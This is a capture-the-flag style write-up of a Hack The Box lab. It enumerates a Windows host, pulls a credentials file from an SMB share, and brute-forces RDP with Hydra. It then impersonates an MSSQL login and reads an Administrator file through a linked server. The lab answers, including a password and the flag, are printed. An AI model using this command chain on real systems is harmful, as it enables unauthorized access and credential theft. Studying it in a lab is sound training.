# HARD
The third server is another internal server used to manage files and working material, such as forms. In addition, a database is used on the server, the purpose of which we do not know.

> Task: What file can you retrieve that belongs to the user "simon"? (Format: filename.txt) **Answer: random.txt**

1. Enumerate the target → found that SMB is enabled
    ```sh
    $ nmap -sV -Pn -p- 10.129.203.10
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-11 04:09 CST
    Nmap scan report for 10.129.203.10
    Host is up (0.24s latency).
    Not shown: 996 filtered tcp ports (no-response)
    PORT     STATE SERVICE       VERSION
    135/tcp  open  msrpc         Microsoft Windows RPC
    445/tcp  open  microsoft-ds?
    1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
    3389/tcp open  ms-wbt-server Microsoft Terminal Services
    ```

2. List available shares:
    ```sh
    $ smbclient -L //10.129.203.10 -N

      Sharename       Type      Comment
      ---------       ----      -------
      ADMIN$          Disk      Remote Admin
      C$              Disk      Default share
      Home            Disk      
      IPC$            IPC       Remote IPC
    ```

3. Interact with share `Home` and found the file:
    ```sh
    $ smbclient //10.129.203.10/Home
    Password for [WORKGROUP\htb-ac-1863259]:
    Try "help" to get a list of possible commands.
    smb: \> ls
      .                                   D        0  Thu Apr 21 16:18:21 2022
      ..                                  D        0  Thu Apr 21 16:18:21 2022
      HR                                  D        0  Thu Apr 21 15:04:39 2022
      IT                                  D        0  Thu Apr 21 15:11:44 2022
      OPS                                 D        0  Thu Apr 21 15:05:10 2022
      Projects                            D        0  Thu Apr 21 15:04:48 2022

        7706623 blocks of size 4096. 3167349 blocks available
    smb: \> cd IT
    smb: \IT\> ls
      .                                   D        0  Thu Apr 21 15:11:44 2022
      ..                                  D        0  Thu Apr 21 15:11:44 2022
      Fiona                               D        0  Thu Apr 21 15:11:53 2022
      John                                D        0  Thu Apr 21 16:15:09 2022
      Simon                               D        0  Thu Apr 21 16:16:07 2022

        7706623 blocks of size 4096. 3167267 blocks available
    smb: \IT\> cd Simon
    smb: \IT\Simon\> ls
      .                                   D        0  Thu Apr 21 16:16:07 2022
      ..                                  D        0  Thu Apr 21 16:16:07 2022
      random.txt                          A       94  Thu Apr 21 16:16:48 2022

        7706623 blocks of size 4096. 3167334 blocks available
    ```

> Task: Enumerate the target and find a password for the user Fiona. What is her password? **Answer: 48Ns72!bns74@S84NNNSl**

1. Retrieve the `creds.txt` from the `Fiona` folder:
    ```sh
    $ smbclient //10.129.203.10/Home
    Password for [WORKGROUP\htb-ac-1863259]:
    Try "help" to get a list of possible commands.
    smb: \> cd IT
    smb: \IT\> cd Fiona
    smb: \IT\Fiona\> ls
      .                                   D        0  Thu Apr 21 15:11:53 2022
      ..                                  D        0  Thu Apr 21 15:11:53 2022
      creds.txt                           A      118  Thu Apr 21 15:13:11 2022

        7706623 blocks of size 4096. 3167326 blocks available
    smb: \IT\Fiona\> get creds.txt
    getting file \IT\Fiona\creds.txt of size 118 as creds.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
    ```

2. Got list of passwords:
    ```sh
    $ cat creds.txt 
    Windows Creds

    kAkd03SA@#!
    48Ns72!bns74@S84NNNSl
    SecurePassword!
    Password123!
    SecureLocationforPasswordsd123!!
    ```

3. Try to brute-force the RDP service with the found credentials → found 1 valid credential `Fiona:48Ns72!bns74@S84NNNSl`:
    ```sh
    $ hydra -l Fiona -P creds.txt 10.129.203.10 rdp
    Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-11 04:38:31
    [WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
    [INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
    [WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
    [DATA] max 4 tasks per 1 server, overall 4 tasks, 5 login tries (l:1/p:5), ~2 tries per task
    [DATA] attacking rdp://10.129.203.10:3389/
    [3389][rdp] host: 10.129.203.10   login: Fiona   password: 48Ns72!bns74@S84NNNSl
    1 of 1 target successfully completed, 1 valid password found
    ```

> Task: Once logged in, what other user can we compromise to gain admin privileges? **Answer: john**

1. Try the found credential `Fiona:48Ns72!bns74@S84NNNSl` to login to the MSSQL service. Then try to impersonate user `john`: 
    ```sh
    $ mssqlclient.py -p 1433 fiona@10.129.203.10 -windows-auth
    Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

    Password:
    [*] Encryption required, switching to TLS
    [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
    [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
    [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
    [*] INFO(WIN-HARD\SQLEXPRESS): Line 1: Changed database context to 'master'.
    [*] INFO(WIN-HARD\SQLEXPRESS): Line 1: Changed language setting to us_english.
    [*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
    [!] Press help for extra shell commands
    SQL (WIN-HARD\Fiona  guest@master)> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
    name    
    -----   
    john    

    simon   

    SQL (WIN-HARD\Fiona  guest@master)>  EXECUTE AS LOGIN = 'john' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin')
          
    ----   
    john   

      0   

    SQL (john  guest@master)>
    ```

> Task: Submit the contents of the flag.txt file on the Administrator Desktop. **Answer: HTB{46u\$!n9\_l!nk3d\_\$3rv3r\$}**

1. Interact with other SQL instance using the linked server configuration. Found out that `john` is the sysadmin at that instance → we have file read access:
    ```sh
    SQL (john  guest@master)> SELECT srvname, isremote FROM sysservers
    srvname                 isremote   
    ---------------------   --------   
    WINSRV02\SQLEXPRESS            1   

    LOCAL.TEST.LINKED.SRV          0   

    SQL (john  guest@master)> EXEC ('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
                    
    -   -   -   -   
    1   1   1   1   

    SQL (john  guest@master)> EXEC ('SELECT BulkColumn FROM OPENROWSET(BULK ''C:\Users\Administrator\Desktop\flag.txt'', SINGLE_CLOB) AS x;') AT [LOCAL.TEST.LINKED.SRV];
    BulkColumn                       
    ------------------------------   
    b'HTB{46u$!n9_l!nk3d_$3rv3r$}'
    ```
